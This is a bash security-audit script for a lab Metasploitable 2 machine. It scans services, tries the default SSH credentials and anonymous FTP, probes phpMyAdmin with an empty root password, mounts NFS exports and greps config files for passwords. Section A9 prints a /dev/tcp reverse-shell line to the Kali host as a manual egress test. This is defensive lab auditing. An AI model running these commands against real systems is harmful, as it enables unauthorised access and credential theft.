#!/bin/bash
# ============================================================
#  AUDIT — METASPLOITABLE 2
#  VARIANT A: Run locally ON the Metasploitable machine itself
#  VARIANT B: Run from Kali (if reachable — that itself is a FAIL!)
#
#  Usage: chmod +x audit_metasploitable.sh && sudo ./audit_metasploitable.sh
#  Output saved to ~/audit_meta.txt
# ============================================================

LOG="$HOME/audit_meta.txt"
DATE=$(date '+%Y-%m-%d %H:%M')

# --- FILL IN IP ADDRESSES BEFORE RUNNING ---
META_IP="192.168.X.X"        # Metasploitable 2 (this machine)
KALI_IP="192.168.X.X"        # Kali Linux (attacker — should be UNREACHABLE)
SERVER_IP="192.168.X.X"      # Main Server
OPERATOR_IP="192.168.X.X"    # Operator Machine
# -------------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

section() {
    echo -e "\n${CYAN}$(printf '=%.0s' {1..60})${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}$(printf '=%.0s' {1..60})${NC}"
    echo -e "\n$(printf '=%.0s' {1..60})\n  $1\n$(printf '=%.0s' {1..60})" >> "$LOG"
}

result() {
    local label="$1" value="$2" status="$3"
    local color=$NC
    case $status in
        OK)   color=$GREEN ;;
        FAIL) color=$RED ;;
        RISK) color=$YELLOW ;;
    esac
    echo -e "  ${color}[$status] $label : $value${NC}"
    echo "  [$status] $label : $value" >> "$LOG"
}

cat > "$LOG" << EOF
============================================================
  SECURITY AUDIT — METASPLOITABLE 2
  Date: $DATE
============================================================
EOF
echo -e "${CYAN}============================================================"
echo "  SECURITY AUDIT — METASPLOITABLE 2"
echo "  Date: $DATE"
echo -e "============================================================${NC}"

# ============================================================
# SECTION A: REMOTE CHECKS (run these from Kali)
# ============================================================

section "A1. REACHABILITY — META FROM SERVER AND OPERATOR (ping test)"

echo "  From Main Server: ping $META_IP" | tee -a "$LOG"
echo "  From Operator:    ping $META_IP" | tee -a "$LOG"
echo "  From Kali:        ping $META_IP  (should TIMEOUT — segmentation check!)" | tee -a "$LOG"

# Automatic check from current machine
if ping -c 2 -W 3 $META_IP &>/dev/null; then
    result "Ping from this machine → Meta" "Reachable" "OK"
else
    result "Ping from this machine → Meta" "Unreachable" "FAIL"
fi

# ------------------------------------------------------------
section "A2. FULL PORT AND SERVICE SCAN"
# ------------------------------------------------------------
echo "  Running nmap -sV on key ports (may take 1-2 minutes)..." | tee -a "$LOG"
nmap -sV --version-intensity 5 -p 21,22,23,25,53,80,139,443,445,3306,5432,6667,8080,8180 \
    $META_IP 2>&1 | tee -a "$LOG"

# ------------------------------------------------------------
section "A3. ANONYMOUS FTP (critical vulnerability)"
# ------------------------------------------------------------
echo "  Checking anonymous FTP login..." | tee -a "$LOG"
FTP_ANON=$(nmap --script ftp-anon -p 21 $META_IP 2>&1)
echo "$FTP_ANON" | tee -a "$LOG"
if echo "$FTP_ANON" | grep -q "Anonymous FTP login allowed"; then
    result "Anonymous FTP" "Allowed! Try: ftp $META_IP" "FAIL"

    echo "  Checking FTP write permissions..." | tee -a "$LOG"
    ftp -n $META_IP <<EOF_FTP 2>&1 | tee -a "$LOG"
quote USER anonymous
quote PASS anonymous@
ls
quit
EOF_FTP
else
    result "Anonymous FTP" "Denied" "OK"
fi

# vsftpd version check (known backdoor: vsftpd 2.3.4)
echo "  FTP service version:" | tee -a "$LOG"
nmap -sV -p 21 $META_IP 2>&1 | grep "21/" | tee -a "$LOG"
VSFTPD=$(nmap -sV -p 21 $META_IP 2>&1 | grep "vsftpd 2.3.4")
if [ -n "$VSFTPD" ]; then
    result "vsftpd version" "2.3.4 — BACKDOOR CVE-2011-2523!" "FAIL"
fi

# ------------------------------------------------------------
section "A4. SSH ROOT LOGIN AND DEFAULT CREDENTIALS"
# ------------------------------------------------------------
echo "  SSH authentication methods:" | tee -a "$LOG"
nmap --script ssh-auth-methods -p 22 $META_IP 2>&1 | tee -a "$LOG"

echo "  Attempting SSH login as msfadmin:msfadmin..." | tee -a "$LOG"
timeout 10 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    msfadmin@$META_IP "id; whoami; echo 'SSH_LOGIN_SUCCESS'" 2>&1 | tee -a "$LOG" | \
    grep -q "SSH_LOGIN_SUCCESS" && \
    result "SSH msfadmin:msfadmin" "LOGIN SUCCESSFUL — default credentials work!" "FAIL" || \
    result "SSH msfadmin:msfadmin" "Login failed" "OK"

echo "  Checking root SSH access:" | tee -a "$LOG"
SSH_ROOT=$(nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 $META_IP 2>&1)
echo "$SSH_ROOT" | grep -E "password|publickey|keyboard" | tee -a "$LOG"

# ------------------------------------------------------------
section "A5. NFS SHARES WITHOUT AUTHENTICATION"
# ------------------------------------------------------------
echo "  Checking NFS exports..." | tee -a "$LOG"
if command -v showmount &>/dev/null; then
    MOUNTS=$(showmount -e $META_IP 2>&1)
    echo "$MOUNTS" | tee -a "$LOG"
    if echo "$MOUNTS" | grep -q "/"; then
        result "NFS shares" "Open exports found!" "FAIL"
        echo "  Attempting to mount NFS share..." | tee -a "$LOG"
        mkdir -p /tmp/nfs_test
        mount -t nfs $META_IP:/ /tmp/nfs_test 2>&1 | tee -a "$LOG" && \
            ls /tmp/nfs_test | tee -a "$LOG"
    else
        result "NFS shares" "None detected" "OK"
    fi
else
    echo "  Install nfs tools: apt install nfs-common" | tee -a "$LOG"
fi

# ------------------------------------------------------------
section "A6. PHPMYADMIN AND WEB SERVICES"
# ------------------------------------------------------------
echo "  Checking web services..." | tee -a "$LOG"

WEB_STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://$META_IP/)
result "HTTP server (port 80)" "HTTP code: $WEB_STATUS" $([ "$WEB_STATUS" = "200" ] && echo "RISK" || echo "OK")

PHPMYADMIN=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://$META_IP/phpmyadmin/)
if [ "$PHPMYADMIN" = "200" ]; then
    result "PHPMyAdmin" "Accessible! Check root login with no password" "RISK"
    echo "  Test command: curl -s -d 'pma_username=root&pma_password=' http://$META_IP/phpmyadmin/" | tee -a "$LOG"
else
    result "PHPMyAdmin" "HTTP $PHPMYADMIN" ""
fi

# Check other vulnerable web applications
for path in "/dvwa/" "/mutillidae/" "/tikiwiki/" "/twiki/"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 http://$META_IP$path)
    if [ "$CODE" = "200" ]; then
        result "Web app $path" "Accessible (HTTP 200)" "RISK"
    fi
done

# ------------------------------------------------------------
section "A7. SAMBA / SMB VULNERABILITIES"
# ------------------------------------------------------------
echo "  SMB version and vulnerability check..." | tee -a "$LOG"
nmap --script smb-vuln* -p 445,139 $META_IP 2>&1 | tee -a "$LOG"

echo "  Attempting anonymous SMB access..." | tee -a "$LOG"
smbclient -L //$META_IP -N 2>&1 | tee -a "$LOG"

# ------------------------------------------------------------
section "A8. TELNET (cleartext data transmission)"
# ------------------------------------------------------------
TELNET_STATUS=$(nmap -p 23 --open $META_IP 2>&1 | grep "23/tcp")
if echo "$TELNET_STATUS" | grep -q "open"; then
    result "Telnet (port 23)" "OPEN — credentials transmitted in cleartext!" "FAIL"
else
    result "Telnet (port 23)" "Closed" "OK"
fi

# ------------------------------------------------------------
section "A9. OUTBOUND TRAFFIC META → KALI (Reverse Shell risk)"
# ------------------------------------------------------------
echo "  =====================================================" | tee -a "$LOG"
echo "  MANUAL VERIFICATION STEPS:" | tee -a "$LOG"
echo "  1. On Kali run:            nc -lvnp 4444" | tee -a "$LOG"
echo "  2. On Metasploitable run:  ping $KALI_IP" | tee -a "$LOG"
echo "     or test:  bash -i >& /dev/tcp/$KALI_IP/4444 0>&1" | tee -a "$LOG"
echo "  If connection succeeds — Meta can initiate outbound connections!" | tee -a "$LOG"
echo "  This means Reverse Shell is possible if the machine is compromised." | tee -a "$LOG"
echo "  =====================================================" | tee -a "$LOG"

# Automated outbound ping check
if ping -c 2 -W 3 $KALI_IP &>/dev/null 2>&1; then
    result "Ping Meta → Kali" "SUCCESS — outbound traffic NOT blocked!" "FAIL"
else
    result "Ping Meta → Kali" "Timeout — outbound blocked, good" "OK"
fi

# Verify Meta can reach Server and Operator (expected)
if ping -c 2 -W 3 $SERVER_IP &>/dev/null 2>&1; then
    result "Ping Meta → Main Server" "Reachable" "OK"
else
    result "Ping Meta → Main Server" "Unreachable — check routing" "FAIL"
fi

if ping -c 2 -W 3 $OPERATOR_IP &>/dev/null 2>&1; then
    result "Ping Meta → Operator" "Reachable" "OK"
else
    result "Ping Meta → Operator" "Unreachable — check routing" "FAIL"
fi

# ============================================================
# SECTION B: LOCAL CHECKS (run directly ON Metasploitable)
# ============================================================

section "B1. RUNNING VULNERABLE SERVICES (local — run on Meta)"

echo "  If running on Meta, execute:" | tee -a "$LOG"
echo "    netstat -tlnp" | tee -a "$LOG"
echo "    ps aux | grep -E 'ftp|telnet|apache|mysql|postgres'" | tee -a "$LOG"

if command -v netstat &>/dev/null; then
    netstat -tlnp 2>&1 | tee -a "$LOG"
fi

# ------------------------------------------------------------
section "B2. ROOT WITHOUT PASSWORD / SUDO PRIVILEGES"
# ------------------------------------------------------------
echo "  Checking sudo rights (on Meta):" | tee -a "$LOG"
if id | grep -q "root\|msfadmin"; then
    sudo -l 2>&1 | tee -a "$LOG"
    if sudo -l 2>&1 | grep -q "(ALL)"; then
        result "sudo rights" "Unrestricted sudo!" "FAIL"
    fi
fi

# ------------------------------------------------------------
section "B3. PASSWORDS IN PLAINTEXT INSIDE CONFIG FILES"
# ------------------------------------------------------------
echo "  Searching for passwords in configuration files (on Meta)..." | tee -a "$LOG"
for conf in /etc/mysql/my.cnf /etc/postgresql/*/main/pg_hba.conf /var/www/dvwa/config/*.php; do
    if [ -f "$conf" ]; then
        echo "  File: $conf" | tee -a "$LOG"
        grep -i "password\|passwd\|pwd" "$conf" 2>/dev/null | head -5 | tee -a "$LOG"
    fi
done

# ============================================================
# FOOTER
# ============================================================
FOOTER="
============================================================
  AUDIT COMPLETE: $DATE
  Log saved to: $LOG
============================================================
  QUICK FILTER:
  grep '\[FAIL\]' $LOG
  grep '\[RISK\]' $LOG
============================================================"
echo "$FOOTER" | tee -a "$LOG"
echo -e "${CYAN}$FOOTER${NC}"
